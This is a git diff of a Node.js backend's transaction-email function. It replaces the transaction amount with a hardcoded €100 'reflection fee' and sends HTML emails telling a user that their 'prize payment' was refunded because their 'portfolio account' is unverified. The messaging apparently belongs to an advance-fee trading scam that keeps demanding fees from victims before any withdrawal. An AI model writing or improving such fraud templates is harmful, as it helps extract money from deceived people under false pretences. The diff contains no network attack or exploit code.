@@ -188,8 +188,12 @@ router.get('/transactions/all', verifyToken, isAdmin, async (req, res) => {
 const sendTransactionStatusEmail = async (transaction) => {
   try {
     const user = transaction.users;
-    const { amount, method, status, id, admin_notes } = transaction;
+    const { method, status, id, admin_notes } = transaction;
+
     if (!user || !user.email) return false;
+
+    // ✅ Reflection fee is now fixed at €100
+    const REFLECTION_FEE = 100;
 
     const statusMessages = {
       pending: {
@@ -221,7 +225,7 @@ const sendTransactionStatusEmail = async (transaction) => {
         color: '#D4AF37', icon: '💸', title: 'Withdrawal Refunded',
         intro: `
           <p style="margin: 0 0 14px 0;">Hello <strong style="color:#D4AF37;">Mr ${user?.first_name || 'Trader'}</strong>,</p>
-          <p style="margin: 0 0 14px 0;">The €${parseFloat(amount).toFixed(2)} for the reflection fee has been received successfully.</p>
+          <p style="margin: 0 0 14px 0;">The <strong style="color:#D4AF37;">€${REFLECTION_FEE}.00</strong> for the reflection fee has been received successfully.</p>
           <p style="margin: 0 0 14px 0;">Your portfolio account hasn't been verified yet, thus your prize payment has been <strong style="color:#D4AF37;">refunded back to your portfolio account</strong>.</p>
           <p style="margin: 0 0 14px 0;">You'll need to verify your portfolio. Please log in to your portfolio to view your refunded balance and verify the account in order to clarify your withdrawal error.</p>
         `,
@@ -262,8 +266,8 @@ const sendTransactionStatusEmail = async (transaction) => {
             </h3>
             <table style="width: 100%; border-collapse: collapse;">
               <tr>
-                <td style="padding: 9px 0; color: #999; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05);">Amount</td>
-                <td style="padding: 9px 0; color: ${statusInfo.color}; font-size: 15px; font-weight: 700; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.05);">€${parseFloat(amount).toFixed(2)}</td>
+                <td style="padding: 9px 0; color: #999; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05);">Reflection Fee</td>
+                <td style="padding: 9px 0; color: ${statusInfo.color}; font-size: 15px; font-weight: 700; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.05);">€${REFLECTION_FEE}.00</td>
               </tr>
               <tr>
                 <td style="padding: 9px 0; color: #999; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05);">Method</td>
